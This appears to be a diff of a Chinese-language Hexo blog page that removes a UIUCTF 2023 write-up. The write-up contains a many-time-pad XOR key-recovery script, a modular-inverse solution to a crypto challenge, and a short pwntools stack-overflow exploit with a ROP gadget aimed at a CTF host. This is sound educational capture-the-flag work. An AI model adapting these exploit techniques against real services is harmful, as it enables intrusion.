class="string">&quot;03f9ea574c267249b2b1ef5d91cd3c99904a3f75873871e94157df0fcbb5d1eab94f9386&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XORs two string</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strxor</span>(<span class="params">a, b</span>):     <span class="comment"># xor two strings (trims the longer input)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(x) ^ <span class="built_in">ord</span>(y)) <span class="keyword">for</span> (x, y) <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)])</span><br><span class="line"></span><br><span class="line"><span class="comment"># To store the final key</span></span><br><span class="line">final_key = [<span class="literal">None</span>]*<span class="number">150</span></span><br><span class="line"><span class="comment"># To store the positions we know are broken</span></span><br><span class="line">known_key_positions = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># For each ciphertext</span></span><br><span class="line"><span class="keyword">for</span> current_index, ciphertext <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	<span class="comment"># for each other ciphertext</span></span><br><span class="line">	<span class="keyword">for</span> index, ciphertext2 <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphers):</span><br><span class="line">		<span class="keyword">if</span> current_index != index: <span class="comment"># don&#x27;t xor a ciphertext with itself</span></span><br><span class="line">			<span class="keyword">for</span> indexOfChar, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>), ciphertext2.decode(<span class="string">&#x27;hex&#x27;</span>))): <span class="comment"># Xor the two ciphertexts</span></span><br><span class="line">				<span class="comment"># If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span></span><br><span class="line">				<span class="keyword">if</span> char <span class="keyword">in</span> string.printable <span class="keyword">and</span> char.isalpha(): counter[indexOfChar] += <span class="number">1</span> <span class="comment"># Increment the counter at this index</span></span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	<span class="comment"># Loop through all positions where a space character was possible in the current_index cipher</span></span><br><span class="line">	<span class="keyword">for</span> ind, val <span class="keyword">in</span> counter.items():</span><br><span class="line">		<span class="comment"># If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span></span><br><span class="line">		<span class="keyword">if</span> val &gt;= <span class="number">7</span>: knownSpaceIndexes.append(ind)</span><br><span class="line">	<span class="comment">#print knownSpaceIndexes # Shows all the positions where we now know the key!</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span></span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&#x27; &#x27;</span>*<span class="number">150</span>)</span><br><span class="line">	<span class="keyword">for</span> index <span class="keyword">in</span> knownSpaceIndexes:</span><br><span class="line">		<span class="comment"># Store the key&#x27;s value at the correct position</span></span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">		<span class="comment"># Record that we known the key at this position</span></span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span></span><br><span class="line">final_key_hex = <span class="string">&#x27;&#x27;</span>.join([val <span class="keyword">if</span> val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="string">&#x27;00&#x27;</span> <span class="keyword">for</span> val <span class="keyword">in</span> final_key])</span><br><span class="line"><span class="comment"># Xor the currently known key with the target cipher</span></span><br><span class="line">output = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),final_key_hex.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Fix this sentence:&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join([char <span class="keyword">if</span> index <span class="keyword">in</span> known_key_positions <span class="keyword">else</span> <span class="string">&#x27;*&#x27;</span> <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(output)])+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WAIT.. MANUAL STEP HERE </span></span><br><span class="line"><span class="comment"># This output are printing a * if that character is not known yet</span></span><br><span class="line"><span class="comment"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span></span><br><span class="line"><span class="comment"># if is too hard, change the target_cipher to another one and try again</span></span><br><span class="line"><span class="comment"># and we have our key to fix the entire text!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sys.exit(0) #comment and continue if u got a good key</span></span><br><span class="line"></span><br><span class="line">target_plaintext = <span class="string">&quot;printed on flammable material so that spies could&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Fixed:&quot;</span></span><br><span class="line"><span class="built_in">print</span> target_plaintext+<span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(<span class="string">&#x27;hex&#x27;</span>),target_plaintext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Decrypted msg:&quot;</span></span><br><span class="line"><span class="keyword">for</span> cipher <span class="keyword">in</span> ciphers:</span><br><span class="line">	<span class="built_in">print</span> strxor(cipher.decode(<span class="string">&#x27;hex&#x27;</span>),key)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\nPrivate key recovered: &quot;</span>+key+<span class="string">&quot;\n&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>运行得到flag</p>
-<h2 id="At-Home"><a href="#At-Home" class="headerlink" title="At Home"></a>At Home</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chal.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(<span class="string">b&quot;uiuctf&#123;******************&#125;&quot;</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">b = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">a_ = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">b_ = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">M = a * b - <span class="number">1</span></span><br><span class="line">e = a_ * M + a</span><br><span class="line">d = b_ * M + b</span><br><span class="line"></span><br><span class="line">n = (e * d - <span class="number">1</span>) // M</span><br><span class="line"></span><br><span class="line">c = (flag * e) % n</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;c = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span><br><span class="line">n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span><br><span class="line">c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span><br></pre></td></tr></table></figure>
-
-<p>通过c=(flag*e)%n可得</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = (flag * e) % n</span><br><span class="line">c * e^-1 = (flag * e * e^-1) % n</span><br><span class="line">c * e^-1 = flag % n</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713</span></span><br><span class="line">n = <span class="number">26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689</span></span><br><span class="line">c = <span class="number">67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869</span></span><br><span class="line">d=inverse(e,n)</span><br><span class="line">flag=(c*d)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>
-
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Chainmail"><a href="#Chainmail" class="headerlink" title="Chainmail"></a>Chainmail</h2><p>一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个<code>ret</code>的地址，否则会造成错误的对齐。<code>ret</code>的地址可以用<code>ROPgadget </code>找，命令:<code>ROPgadget --binary chal --only  &#39;ret&#39;</code>。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = remote(<span class="string">&quot;chainmail.chal.uiuc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">72</span> +p64(<span class="number">0x40101a</span>) + p64(<span class="number">0x401216</span>)</span><br><span class="line">a.sendline(payload)</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure>
-
-<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="peanut-xss"><a href="#peanut-xss" class="headerlink" title="peanut-xss"></a>peanut-xss</h2><p>XSS学的不是很好，具体怎么解可以看下面的文章:</p>
-<p><a target="_blank" rel="noopener" href="https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss">https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1440,7 +1392,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1489,12 +1441,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">85k</span>
+    <span title="站点总字数">86k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:17</span>
+    <span title="站点阅读时长">1:19</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
